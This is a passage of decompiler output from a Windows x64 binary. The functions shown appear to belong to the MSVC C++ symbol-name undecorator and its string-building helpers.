  {
    return (unsigned int)sub_13F15FDD8(a1, a2, a3);
  }
  else
  {
    sub_13F15FE04(&v8, a3, v6);
    sub_13F15FE10(a1, a2, a3, v6);
  }
  return (unsigned int)v6;
}

//----- (000000013F16116C) ----------------------------------------------------
char __fastcall sub_13F16116C(__int64 a1, _DWORD *a2)
{
  char v4; // r14
  int i; // edi
  int *v6; // r12
  int v7; // ebp
  __int64 v8; // rbx
  __int64 v9; // rax

  if ( !a2 )
    sub_13F16A158();
  v4 = 0;
  for ( i = 0; i < *a2; ++i )
  {
    v6 = (int *)(sub_13F15E3A8() + *(int *)(*(_QWORD *)(a1 + 48) + 12i64) + 4i64);
    v7 = *(_DWORD *)(sub_13F15E3A8() + *(int *)(*(_QWORD *)(a1 + 48) + 12i64));
    if ( v7 > 0 )
    {
      while ( 1 )
      {
        v8 = *v6 + sub_13F15E3A8();
        v9 = sub_13F15E394();
        if ( (unsigned int)sub_13F1608E0(v9 + 20i64 * i + (int)a2[1], v8, *(_BYTE **)(a1 + 48)) )
          break;
        --v7;
        ++v6;
        if ( v7 <= 0 )
          goto LABEL_8;
      }
      v4 = 1;
    }
LABEL_8:
    ;
  }
  return v4;
}

//----- (000000013F161244) ----------------------------------------------------
char __fastcall sub_13F161244(int *a1)
{
  int v1; // ebp
  __int64 i; // rsi
  __int64 v4; // rbx
  __int64 v5; // rcx

  v1 = 0;
  if ( *a1 <= 0 )
    return 0;
  for ( i = 0i64; ; i += 20i64 )
  {
    if ( *(_DWORD *)(i + a1[1] + sub_13F15E394() + 4) )
    {
      v4 = sub_13F15E394();
      v5 = *(int *)(i + a1[1] + v4 + 4) + sub_13F15E394();
    }
    else
    {
      v5 = 0i64;
    }
    if ( !(unsigned int)sub_13F15E52C(v5 + 8, (__int64)&qword_13F1C1B28) )
      break;
    if ( ++v1 >= *a1 )
      return 0;
  }
  return 1;
}
// 13F1C1B28: using guessed type __int64 qword_13F1C1B28;

//----- (000000013F1612D8) ----------------------------------------------------
__int64 __fastcall sub_13F1612D8(__int64 a1, __int64 (__fastcall *a2)(__int64, __int64), __int64 a3)
{
  return a2(a1, a3);
}

//----- (000000013F1612E4) ----------------------------------------------------
__int64 __fastcall sub_13F1612E4(
        __int64 a1,
        __int64 (__fastcall *a2)(__int64, __int64, _QWORD),
        __int64 a3,
        unsigned int a4)
{
  return a2(a1, a3, a4);
}

//----- (000000013F1612F4) ----------------------------------------------------
__int64 __fastcall sub_13F1612F4(__int64 a1, char **a2, char a3)
{
  char *v5; // rdx
  char v7; // cl
  unsigned int v8; // er8
  char *v9; // r9
  __int64 v10; // r10
  char v11; // cl

  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  v5 = *a2;
  if ( !v5 )
  {
LABEL_15:
    *(_BYTE *)(a1 + 8) = 2;
    return a1;
  }
  v7 = *v5;
  if ( !*v5 )
    goto LABEL_14;
  v8 = 0;
  v9 = v5;
  do
  {
    if ( v7 == a3 )
      break;
    if ( (unsigned __int8)(v7 - 36) <= 0x3Bu )
    {
      v10 = 0x87FFFFFE53FF201i64;
      if ( _bittest64(&v10, (char)(v7 - 36)) )
        continue;
    }
    if ( (unsigned __int8)(v7 - 97) > 0x19u && (unsigned __int8)(v7 + 0x80) > 0x7Eu )
      goto LABEL_15;
    ++v8;
    *a2 = ++v9;
    v7 = *v9;
  }
  while ( *v9 );
  sub_13F1627A8(a1, v5, v8);
  v11 = **a2;
  if ( !v11 )
  {
    if ( *(_BYTE *)(a1 + 8) )
      return a1;
LABEL_14:
    *(_BYTE *)(a1 + 8) = 1;
    return a1;
  }
  ++*a2;
  if ( v11 != a3 )
  {
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 3;
  }
  return a1;
}

//----- (000000013F1613C0) ----------------------------------------------------
__int64 __fastcall sub_13F1613C0(__int64 a1, __int64 a2)
{
  char v2; // bl
  __int64 v3; // rsi
  _QWORD *v5; // r8
  __int64 result; // rax

  v2 = 0;
  v3 = a2;
  *(_DWORD *)(a1 + 8) = 0;
  if ( a2 )
  {
    v5 = (_QWORD *)sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
    if ( v5 )
    {
      *v5 = off_13F18D5B0;
      if ( (unsigned __int8)(*(_BYTE *)(v3 + 8) - 2) <= 1u )
        v3 = 0i64;
      v5[1] = v3;
    }
    else
    {
      v5 = 0i64;
    }
    v2 = v5 == 0i64 ? 3 : 0;
  }
  else
  {
    v5 = 0i64;
  }
  *(_QWORD *)a1 = v5;
  result = a1;
  *(_BYTE *)(a1 + 8) = v2;
  return result;
}
// 13F18D5B0: using guessed type __int64 (__fastcall *off_13F18D5B0[8])();
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F161444) ----------------------------------------------------
__int64 __fastcall sub_13F161444(__int64 a1, char *a2)
{
  char *v3; // rax
  unsigned int v4; // er8

  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  if ( a2 )
  {
    v3 = a2;
    v4 = 0;
    if ( *a2 )
    {
      do
      {
        ++v3;
        ++v4;
      }
      while ( *v3 );
      if ( v4 )
        sub_13F1627A8(a1, a2, v4);
    }
  }
  return a1;
}

//----- (000000013F161484) ----------------------------------------------------
__int64 __fastcall sub_13F161484(__int64 a1, __int64 a2)
{
  char *v2; // r9
  unsigned __int64 v4; // r8
  int v5; // esp
  char v7; // [rsp+35h] [rbp-13h] BYREF

  v2 = &v7;
  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  v7 = 0;
  v4 = abs64(a2);
  do
  {
    *--v2 = v4 % 0xA + 48;
    v4 /= 0xAui64;
  }
  while ( v4 );
  if ( a2 < 0 )
    *--v2 = 45;
  sub_13F1627A8(a1, v2, v5 + 53 - (_DWORD)v2);
  return a1;
}
// 13F161501: variable 'v5' is possibly undefined

//----- (000000013F16152C) ----------------------------------------------------
__int64 __fastcall sub_13F16152C(__int64 a1, unsigned __int64 a2)
{
  char *v2; // r9
  int v5; // esp
  char v7; // [rsp+34h] [rbp-14h] BYREF

  v2 = &v7;
  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  v7 = 0;
  do
  {
    *--v2 = a2 % 0xA + 48;
    a2 /= 0xAui64;
  }
  while ( a2 );
  sub_13F1627A8(a1, v2, v5 + 52 - (_DWORD)v2);
  return a1;
}
// 13F16158B: variable 'v5' is possibly undefined

//----- (000000013F1615B4) ----------------------------------------------------
__int64 __fastcall sub_13F1615B4(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v6; // rax
  _BYTE *v7; // rcx
  __int64 v8; // rsi
  __int64 v9; // rdx

  *(_QWORD *)a1 = off_13F18D590;
  if ( a3 && a2 )
  {
    v6 = sub_13F164BD0((__int64)&off_13F1C5FB0, (int)a3, 0);
    *(_QWORD *)(a1 + 8) = v6;
    v7 = (_BYTE *)v6;
    *(_DWORD *)(a1 + 16) = a3;
    if ( v6 )
    {
      if ( a3 )
      {
        v8 = a2 - v6;
        v9 = a3;
        do
        {
          *v7 = v7[v8];
          ++v7;
          --v9;
        }
        while ( v9 );
      }
    }
    else
    {
      *(_DWORD *)(a1 + 16) = 0;
    }
  }
  else
  {
    *(_QWORD *)(a1 + 8) = 0i64;
    *(_DWORD *)(a1 + 16) = 0;
  }
  return a1;
}
// 13F18D590: using guessed type __int64 (__fastcall *off_13F18D590[4])();
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F161644) ----------------------------------------------------
__int64 __fastcall sub_13F161644(__int64 a1, char *a2)
{
  char *v3; // rax
  unsigned int v4; // er8

  v3 = a2;
  v4 = 0;
  *(_QWORD *)a1 = 0i64;
  for ( *(_DWORD *)(a1 + 8) = 0; *v3; ++v4 )
    ++v3;
  sub_13F1627A8(a1, a2, v4);
  return a1;
}

//----- (000000013F16167C) ----------------------------------------------------
__int64 __fastcall sub_13F16167C(signed int *a1, __int64 a2, signed int a3)
{
  __int64 v3; // rcx

  if ( (unsigned int)a3 > 9 )
  {
    *(_DWORD *)(a2 + 8) = 0;
    *(_BYTE *)(a2 + 8) = 3;
    goto LABEL_7;
  }
  if ( *a1 == -1 || a3 > *a1 )
  {
    *(_DWORD *)(a2 + 8) = 0;
    *(_BYTE *)(a2 + 8) = 2;
LABEL_7:
    *(_QWORD *)a2 = 0i64;
    return a2;
  }
  v3 = *(_QWORD *)&a1[2 * a3 + 2];
  *(_QWORD *)a2 = *(_QWORD *)v3;
  *(_DWORD *)(a2 + 8) = *(_DWORD *)(v3 + 8);
  return a2;
}

//----- (000000013F1616BC) ----------------------------------------------------
__int64 __fastcall sub_13F1616BC(__int64 a1, __int64 a2, __int64 a3)
{
  *(_QWORD *)a2 = *(_QWORD *)a1;
  *(_DWORD *)(a2 + 8) = *(_DWORD *)(a1 + 8);
  sub_13F16176C(a2, a3);
  return a2;
}

//----- (000000013F1616E8) ----------------------------------------------------
__int64 __fastcall sub_13F1616E8(__int64 a1, __int64 a2, char a3)
{
  *(_QWORD *)a2 = *(_QWORD *)a1;
  *(_DWORD *)(a2 + 8) = *(_DWORD *)(a1 + 8);
  sub_13F1617B0(a2, a3);
  return a2;
}

//----- (000000013F161714) ----------------------------------------------------
__int64 __fastcall sub_13F161714(__int64 a1, __int64 a2, char *a3)
{
  *(_QWORD *)a2 = *(_QWORD *)a1;
  *(_DWORD *)(a2 + 8) = *(_DWORD *)(a1 + 8);
  sub_13F161830(a2, a3);
  return a2;
}

//----- (000000013F161740) ----------------------------------------------------
__int64 __fastcall sub_13F161740(__int64 a1, __int64 a2, unsigned int a3)
{
  *(_QWORD *)a2 = *(_QWORD *)a1;
  *(_DWORD *)(a2 + 8) = *(_DWORD *)(a1 + 8);
  sub_13F1618BC(a2, a3);
  return a2;
}

//----- (000000013F16176C) ----------------------------------------------------
__int64 __fastcall sub_13F16176C(__int64 a1, __int64 a2)
{
  if ( *(char *)(a1 + 8) <= 1 )
  {
    if ( *(_QWORD *)a2 )
    {
      if ( *(_QWORD *)a1 )
      {
        sub_13F161990((__int64 *)a1, *(_QWORD *)a2);
      }
      else
      {
        *(_QWORD *)a1 = *(_QWORD *)a2;
        *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
      }
    }
    else
    {
      sub_13F1618BC(a1, *(char *)(a2 + 8));
    }
  }
  return a1;
}

//----- (000000013F1617B0) ----------------------------------------------------
__int64 __fastcall sub_13F1617B0(__int64 a1, char a2)
{
  __int64 v4; // rax
  char v6; // [rsp+30h] [rbp+8h] BYREF

  if ( *(char *)(a1 + 8) <= 1 && a2 )
  {
    if ( *(_QWORD *)a1 )
    {
      v4 = sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
      if ( v4 )
      {
        *(_BYTE *)(v4 + 8) = a2;
        *(_QWORD *)v4 = &charNode::`vftable';
      }
      sub_13F161990((__int64 *)a1, v4);
    }
    else
    {
      *(_QWORD *)a1 = 0i64;
      *(_DWORD *)(a1 + 8) = 0;
      v6 = a2;
      sub_13F1627A8(a1, &v6, 1u);
    }
  }
  return a1;
}
// 13F18D570: using guessed type void *charNode::`vftable';
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F161830) ----------------------------------------------------
__int64 __fastcall sub_13F161830(__int64 a1, char *a2)
{
  __int64 v4; // rbx
  __int64 v5; // rax
  char *v6; // rcx
  unsigned int i; // er8

  if ( *(char *)(a1 + 8) <= 1 )
  {
    v4 = 0i64;
    if ( a2 )
    {
      if ( *a2 )
      {
        if ( *(_QWORD *)a1 )
        {
          v5 = sub_13F164BD0((__int64)&off_13F1C5FB0, 24i64, 0);
          if ( v5 )
          {
            v6 = a2;
            for ( i = 0; *v6; ++i )
              ++v6;
            v4 = sub_13F1615B4(v5, (__int64)a2, i);
          }
          sub_13F161990((__int64 *)a1, v4);
        }
        else
        {
          sub_13F161644(a1, a2);
        }
      }
    }
  }
  return a1;
}
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F1618BC) ----------------------------------------------------
__int64 __fastcall sub_13F1618BC(__int64 a1, unsigned int a2)
{
  __int64 *v3; // rdx
  __int64 *v4; // rax

  if ( *(char *)(a1 + 8) <= 1 )
  {
    if ( *(_QWORD *)a1 && a2 - 2 > 1 )
    {
      if ( a2 )
      {
        if ( a2 > 3 )
          v3 = qword_13F18D640;
        else
          v3 = &qword_13F18D610[2 * (int)a2];
        sub_13F161990((__int64 *)a1, (__int64)v3);
      }
    }
    else
    {
      *(_DWORD *)(a1 + 8) = 0;
      v4 = qword_13F18D620;
      *(_BYTE *)(a1 + 8) = a2;
      if ( a2 != 1 )
        v4 = 0i64;
      *(_QWORD *)a1 = v4;
    }
  }
  return a1;
}
// 13F18D610: using guessed type __int64 qword_13F18D610[2];
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F18D640: using guessed type __int64 qword_13F18D640[2];

//----- (000000013F161928) ----------------------------------------------------
int *__fastcall sub_13F161928(int *a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // r8
  __int64 v6; // rcx

  if ( *a1 != 9 && *(_QWORD *)a2 )
  {
    v4 = sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
    v5 = v4;
    if ( v4 )
    {
      *(_QWORD *)v4 = *(_QWORD *)a2;
      *(_DWORD *)(v4 + 8) = *(_DWORD *)(a2 + 8);
    }
    else
    {
      v5 = 0i64;
    }
    if ( v5 )
    {
      v6 = *a1;
      *a1 = v6 + 1;
      *(_QWORD *)&a1[2 * v6 + 4] = v5;
    }
  }
  return a1;
}
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F161990) ----------------------------------------------------
void __fastcall sub_13F161990(__int64 *a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rdx

  if ( a2 )
  {
    v4 = sub_13F164BD0((__int64)&off_13F1C5FB0, 32i64, 0);
    if ( v4 )
    {
      v5 = *a1;
      *(_DWORD *)(v4 + 24) = -1;
      *(_QWORD *)v4 = off_13F18D5F0;
      *(_QWORD *)(v4 + 8) = v5;
      *(_QWORD *)(v4 + 16) = a2;
    }
    *a1 = v4;
    if ( !v4 )
      *((_BYTE *)a1 + 8) = 3;
  }
  else
  {
    *((_BYTE *)a1 + 8) = 3;
  }
}
// 13F18D5F0: using guessed type __int64 (__fastcall *off_13F18D5F0[3])();
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F1619F4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1619F4(__int64 a1, __int64 a2)
{
  int v4; // esi
  __int64 *v5; // rax
  bool v6; // zf
  unsigned int v7; // eax
  int v8; // er14
  int v9; // er13
  int v10; // er12
  int v11; // er13
  int v12; // ecx
  __int64 v13; // rax
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  BOOL v20; // er15
  int v21; // eax
  __int64 v22; // rax
  __int64 v23; // rax
  __int64 *v24; // rcx
  __int64 v25; // r15
  __int64 v26; // rbx
  __int64 v27; // rax
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 *v30; // rcx
  int v31; // eax
  __int64 v32; // rax
  __int64 v33; // rax
  __int64 v34; // rax
  __int64 v35; // rax
  __int64 v36; // rax
  char *v37; // rdx
  __int64 *v38; // rcx
  __int64 v39; // rax
  __int64 v40; // rax
  __int64 v41; // rax
  __int64 v42; // rax
  __int64 v43; // rbx
  __int64 v44; // rax
  __int64 v45; // rax
  __int64 v46; // rax
  __int64 v47; // rax
  __int64 v48; // rax
  int v49; // eax
  __int64 v50; // rbx
  __int64 v51; // rax
  __int64 v52; // rax
  BOOL v53; // eax
  int v54; // ebx
  int v55; // edx
  char *v56; // rdx
  int v57; // edx
  __int64 v58; // rax
  __int64 *v59; // rcx
  int v60; // ecx
  int v61; // ebx
  int v62; // eax
  __int64 v63; // rax
  __int64 v64; // rax
  BOOL v65; // ecx
  int v66; // edx
  char *v67; // rdx
  BOOL v68; // ecx
  BOOL v69; // eax
  BOOL v70; // ecx
  BOOL v71; // eax
  __int64 v72; // rax
  __int64 v73; // rax
  __int64 v74; // rax
  __int64 *v76; // [rsp+30h] [rbp-D0h] BYREF
  unsigned int v77; // [rsp+38h] [rbp-C8h]
  __int64 *v78; // [rsp+40h] [rbp-C0h] BYREF
  int v79; // [rsp+48h] [rbp-B8h]
  __int64 *v80; // [rsp+50h] [rbp-B0h] BYREF
  unsigned int v81; // [rsp+58h] [rbp-A8h]
  __int64 *v82; // [rsp+60h] [rbp-A0h] BYREF
  unsigned int v83; // [rsp+68h] [rbp-98h]
  char v84[16]; // [rsp+70h] [rbp-90h] BYREF
  __int64 *v85; // [rsp+80h] [rbp-80h] BYREF
  unsigned int v86; // [rsp+88h] [rbp-78h]
  __int64 v87; // [rsp+90h] [rbp-70h] BYREF
  int v88; // [rsp+98h] [rbp-68h]
  int v89; // [rsp+A0h] [rbp-60h]
  int v90; // [rsp+A4h] [rbp-5Ch]
  __int64 *v91; // [rsp+A8h] [rbp-58h] BYREF
  unsigned int v92; // [rsp+B0h] [rbp-50h]
  int v93; // [rsp+B8h] [rbp-48h]
  __int64 *v94; // [rsp+C0h] [rbp-40h] BYREF
  int v95; // [rsp+C8h] [rbp-38h]
  __int64 *v96; // [rsp+D0h] [rbp-30h] BYREF
  unsigned int v97; // [rsp+D8h] [rbp-28h]
  char v98[16]; // [rsp+E0h] [rbp-20h] BYREF
  char v99[16]; // [rsp+F0h] [rbp-10h] BYREF
  char v100[16]; // [rsp+100h] [rbp+0h] BYREF
  char v101[64]; // [rsp+110h] [rbp+10h] BYREF
  char v102; // [rsp+168h] [rbp+68h] BYREF
  BOOL v103; // [rsp+170h] [rbp+70h]
  BOOL v104; // [rsp+178h] [rbp+78h]

  v77 = 0;
  v93 = (_DWORD)off_13F1C5F88 - (_DWORD)off_13F1C5F90;
  v76 = 0i64;
  v4 = sub_13F166CB4();
  v5 = *(__int64 **)a2;
  if ( !*(_QWORD *)a2 || (v6 = (*(_DWORD *)(a2 + 8) & 0x200) == 0, v89 = 1, v6) )
    v89 = 0;
  switch ( v4 )
  {
    case 0xFFFF:
      *(_DWORD *)(a1 + 8) = 0;
      *(_BYTE *)(a1 + 8) = 2;
      *(_QWORD *)a1 = 0i64;
      return a1;
    case 0xFFFE:
      v83 = 0;
      v82 = qword_13F18D620;
      sub_13F1616BC((__int64)&v82, a1, a2);
      return a1;
    case 0xFFFD:
      *(_QWORD *)a1 = v5;
      v7 = *(_DWORD *)(a2 + 8);
LABEL_122:
      *(_DWORD *)(a1 + 8) = v7;
      return a1;
  }
  v8 = v4 & 0x8000;
  if ( (v4 & 0x8000) != 0 )
  {
    v9 = 4096;
    v10 = v4 & 0x1800;
    v103 = v10 == 2048;
    v104 = (v4 & 0x6000) == 0;
    if ( v10 == 2048 )
      v9 = 1024;
    v11 = v4 & v9;
    if ( !v11 || (v12 = v4 & 0x1B00, ((v12 - 4096) & 0xFFFFFCFF) != 0) || v12 == 4864 )
    {
      if ( (v4 & 0x4000) != 0 )
      {
        v13 = sub_13F162CC4((__int64)&v78);
        v82 = 0i64;
        v83 = 0;
        v102 = 32;
        v14 = v13;
        sub_13F1627A8((__int64)&v82, &v102, 1u);
        sub_13F1616BC((__int64)&v82, (__int64)&v91, v14);
        v76 = v91;
        v77 = v92;
      }
      if ( v11 && v10 == 6144 )
      {
        v15 = sub_13F1616E8(a2, (__int64)&v87, 123);
        sub_13F163E7C((__int64)&v78, 0);
        v16 = sub_13F1616BC(v15, (__int64)&v82, (__int64)&v78);
        sub_13F16176C((__int64)&v76, v16);
        if ( aAvrsafunctionC[25] )
        {
          if ( aAvrsafunctionC[25] == 65 )
          {
            off_13F1C5F88 = &aAvrsafunctionC[26];
            sub_13F161444((__int64)&v85, "{flat}");
          }
          else
          {
            v86 = 2;
            v85 = 0i64;
          }
        }
        else
        {
          v86 = 0;
          v85 = qword_13F18D620;
        }
        v102 = 44;
        v82 = 0i64;
        v83 = 0;
        sub_13F1627A8((__int64)&v82, &v102, 1u);
        sub_13F1616BC((__int64)&v82, (__int64)&v78, (__int64)&v85);
        v17 = sub_13F161714((__int64)&v78, (__int64)&v87, "}' ");
        sub_13F16176C((__int64)&v76, v17);
        sub_13F161830((__int64)&v76, "}'");
        sub_13F1631F4((__int64)&v78);
        v102 = 32;
        v82 = 0i64;
        v83 = 0;
        sub_13F1627A8((__int64)&v82, &v102, 1u);
        sub_13F1616BC((__int64)&v82, (__int64)&v87, (__int64)&v78);
        v18 = sub_13F1616E8((__int64)&v87, (__int64)&v91, 32);
        v19 = sub_13F1616BC(v18, (__int64)&v96, (__int64)&v76);
        v20 = v104;
        goto LABEL_89;
      }
      v96 = 0i64;
      v97 = 0;
      v91 = 0i64;
      v92 = 0;
      v85 = 0i64;
      v86 = 0;
      v82 = 0i64;
      v83 = 0;
      v94 = 0i64;
      v95 = 0;
      if ( !v11 )
      {
LABEL_34:
        if ( v10 == 2048 && (v4 & 0x700) != 512 )
        {
          v87 = 0i64;
          v88 = 0;
          v80 = 0i64;
          v81 = 0;
          sub_13F163334((__int64)&v78, (__int64)&v87, byte_13F19C050, &v80, 1);
          v94 = v78;
          v95 = v79;
        }
        v22 = sub_13F1631F4((__int64)&v78);
        v23 = sub_13F1616BC(v22, (__int64)&v87, (__int64)&v76);
        v24 = *(__int64 **)v23;
        LODWORD(v23) = *(_DWORD *)(v23 + 8);
        v76 = v24;
        v77 = v23;
        if ( *(_QWORD *)a2 )
        {
          if ( v24 )
          {
            v102 = 32;
            v80 = 0i64;
            v81 = 0;
            sub_13F1627A8((__int64)&v80, &v102, 1u);
            sub_13F1616BC((__int64)&v80, (__int64)&v78, a2);
            sub_13F16176C((__int64)&v76, (__int64)&v78);
          }
          else
          {
            v76 = *(__int64 **)a2;
            v77 = *(_DWORD *)(a2 + 8);
          }
        }
        v25 = 0i64;
        v80 = 0i64;
        v90 = 0;
        if ( v89 )
        {
          v26 = sub_13F165AD4((__int64)&v87, 0i64);
          v27 = sub_13F161444((__int64)v99, " ");
          sub_13F1616BC(v27, (__int64)&v78, v26);
          sub_13F16176C((__int64)&v76, (__int64)&v78);
        }
        else
        {
          v28 = sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
          v25 = v28;
          if ( v28 )
          {
            *(_QWORD *)v28 = 0i64;
            *(_DWORD *)(v28 + 8) = 0;
          }
          else
          {
            v25 = 0i64;
          }
          v29 = sub_13F165AD4((__int64)v99, v25);
          v30 = *(__int64 **)v29;
          LODWORD(v29) = *(_DWORD *)(v29 + 8);
          v80 = v30;
          v90 = v29;
        }
        if ( !v11 )
          goto LABEL_56;
        if ( v10 == 2048 )
        {
          v31 = v4 & 0x700;
          if ( v31 == 1536 )
          {
            v32 = sub_13F161444((__int64)v99, "`vtordispex{");
            sub_13F1616BC(v32, (__int64)&v78, (__int64)&v96);
            v33 = sub_13F1616E8((__int64)&v78, (__int64)&v87, 44);
            v34 = sub_13F1616BC(v33, (__int64)v100, (__int64)&v91);
            v35 = sub_13F1616E8(v34, (__int64)v101, 44);
            v36 = sub_13F1616BC(v35, (__int64)v98, (__int64)&v85);
            v37 = v84;
            v38 = (__int64 *)v36;
LABEL_53:
            v40 = sub_13F1616E8((__int64)v38, (__int64)v37, 44);
            sub_13F16176C((__int64)&v76, v40);
LABEL_55:
            v41 = sub_13F161714((__int64)&v82, (__int64)v84, "}' ");
            sub_13F16176C((__int64)&v76, v41);
LABEL_56:
            v42 = sub_13F16297C((__int64)v84);
            v102 = 40;
            v82 = 0i64;
            v83 = 0;
            v43 = v42;
            sub_13F1627A8((__int64)&v82, &v102, 1u);
            sub_13F1616BC((__int64)&v82, (__int64)&v78, v43);
            v44 = sub_13F1616E8((__int64)&v78, (__int64)v98, 41);
            sub_13F16176C((__int64)&v76, v44);
            if ( v10 == 2048 && (v4 & 0x700) != 512 )
              sub_13F16176C((__int64)&v76, (__int64)&v94);
            v45 = sub_13F165994((__int64)v84);
            sub_13F16176C((__int64)&v76, v45);
            v46 = sub_13F164C7C((__int64)v84);
            sub_13F16176C((__int64)&v76, v46);
            v47 = sub_13F166C90((__int64)v84);
            sub_13F16176C((__int64)&v76, v47);
            v48 = sub_13F163FF8((__int64)v84);
            if ( (_BYTE)v77 != 3 && *(char *)(v48 + 8) > 1 )
              v77 = *(unsigned __int8 *)(v48 + 8) | v77 & 0xFFFFFF00;
            if ( !v25 )
            {
              v20 = v104;
              goto LABEL_91;
            }
            *(_QWORD *)v25 = v76;
            *(_DWORD *)(v25 + 8) = v77;
            v20 = v104;
            v76 = v80;
            v49 = v90;
            goto LABEL_90;
          }
          if ( v31 == 1280 )
          {
            v39 = sub_13F161444((__int64)v84, "`vtordisp{");
            sub_13F1616BC(v39, (__int64)&v78, (__int64)&v85);
            v37 = v98;
            v38 = (__int64 *)&v78;
            goto LABEL_53;
          }
        }
        sub_13F161830((__int64)&v76, "`adjustor{");
        goto LABEL_55;
      }
      if ( v10 == 2048 )
      {
        v21 = v4 & 0x700;
        if ( v21 == 1536 )
        {
          sub_13F163E7C((__int64)&v80, 1);
          v96 = v80;
          v97 = v81;
          sub_13F163E7C((__int64)&v80, 1);
          v91 = v80;
          v92 = v81;
LABEL_32:
          sub_13F163E7C((__int64)&v80, 1);
          v85 = v80;
          v86 = v81;
          goto LABEL_33;
        }
        if ( v21 == 1280 )
          goto LABEL_32;
      }
LABEL_33:
      sub_13F163E7C((__int64)&v80, 1);
      v82 = v80;
      v83 = v81;
      goto LABEL_34;
    }
  }
  sub_13F16176C((__int64)&v76, a2);
  if ( (v4 & 0x8000) == 0 )
  {
    if ( (((v4 & 0x7C00) - 26624) & 0xFFFFF7FF) == 0 )
    {
      sub_13F167120(a1, (__int64)&v76);
      return a1;
    }
    if ( (v4 & 0x7C00) == 24576 )
    {
      v50 = sub_13F1616E8((__int64)&v76, (__int64)v84, 123);
      sub_13F163E7C((__int64)&v78, 0);
      v51 = sub_13F1616BC(v50, (__int64)v98, (__int64)&v78);
      sub_13F161714(v51, a1, "}'");
      return a1;
    }
  }
  if ( (v4 & 0xFC00) != 31744 )
  {
    v10 = v4 & 0x1800;
    v103 = v10 == 2048;
    v20 = (v4 & 0x6000) == 0;
    v53 = v20;
    if ( (v4 & 0x8000) != 0 )
      v53 = v10 == 2048;
    v54 = v4 & (v53 ? 1024 : 4096);
    if ( v54 )
    {
      v55 = v4 & 0x1B00;
      if ( v8 != 0 && v55 == 4096 )
      {
        v56 = "`local static destructor helper'";
LABEL_81:
        sub_13F161830((__int64)&v76, v56);
LABEL_84:
        if ( !v54 || (v57 = v4 & 0x1B00, v8 == 0 || v57 != 4352) && (v8 == 0 || v57 != 4608) )
        {
          v19 = sub_13F1644B4((__int64)v84, (__int64)&v76);
LABEL_89:
          v59 = *(__int64 **)v19;
          v49 = *(_DWORD *)(v19 + 8);
          v76 = v59;
          goto LABEL_90;
        }
        v58 = sub_13F161444((__int64)v84, " ");
        sub_13F1616BC(v58, (__int64)&v78, (__int64)&v76);
        v76 = v78;
        v49 = v79;
LABEL_90:
        v77 = v49;
LABEL_91:
        if ( (v4 & 0x8000) != 0 )
          v20 = v103;
        if ( !v20 )
          goto LABEL_117;
        v60 = 0;
        v61 = v4 & 0x700;
        v62 = 1;
        if ( (v4 & 0x8000) != 0 )
        {
          LOBYTE(v60) = v61 == 512;
          v62 = v60;
        }
        if ( v62 )
        {
          v63 = sub_13F161444((__int64)v84, "static ");
          sub_13F1616BC(v63, (__int64)&v78, (__int64)&v76);
          v76 = v78;
          v77 = v79;
        }
        if ( (v4 & 0x8000) != 0 && v61 == 256
          || ((v20 ? 1024 : 4096) & v4) != 0 && ((v61 - 1024) & 0xFFFFFCFF) == 0 && v61 != 1792 )
        {
          v64 = sub_13F161444((__int64)v84, "virtual ");
          sub_13F1616BC(v64, (__int64)&v78, (__int64)&v76);
          v76 = v78;
          v77 = v79;
        }
        v65 = v103;
        v66 = v4 & 0xC0;
        if ( (v4 & 0x8000) != 0 )
          v65 = v66 == 64;
        if ( v65 )
        {
          v67 = "private: ";
        }
        else
        {
          v68 = 0;
          v69 = v10 == 4096;
          if ( (v4 & 0x8000) != 0 )
          {
            LOBYTE(v68) = v66 == 128;
            v69 = v68;
          }
          if ( v69 )
          {
            v67 = "protected: ";
          }
          else
          {
            v70 = 0;
            v71 = v10 == 0;
            if ( (v4 & 0x8000) != 0 )
            {
              LOBYTE(v70) = v66 == 0;
              v71 = v70;
            }
            if ( !v71 )
              goto LABEL_117;
            v67 = "public: ";
          }
        }
        v72 = sub_13F161444((__int64)v84, v67);
        sub_13F1616BC(v72, (__int64)&v78, (__int64)&v76);
        v76 = v78;
        v77 = v79;
LABEL_117:
        if ( ((v20 ? 1024 : 4096) & v4) != 0 )
        {
          v73 = sub_13F161444((__int64)v84, "[thunk]:");
          sub_13F1616BC(v73, (__int64)&v78, (__int64)&v76);
          v76 = v78;
          v77 = v79;
        }
        if ( (v4 & 0x10000) != 0 )
        {
          v74 = sub_13F161444((__int64)v84, "extern \"C\" ");
          sub_13F1616BC(v74, (__int64)&v78, (__int64)&v76);
          v76 = v78;
          v77 = v79;
        }
        goto LABEL_121;
      }
      if ( v8 != 0 && v55 == 4352 )
      {
        v56 = "`template static data member constructor helper'";
        goto LABEL_81;
      }
      if ( v8 != 0 && v55 == 4608 )
      {
        v56 = "`template static data member destructor helper'";
        goto LABEL_81;
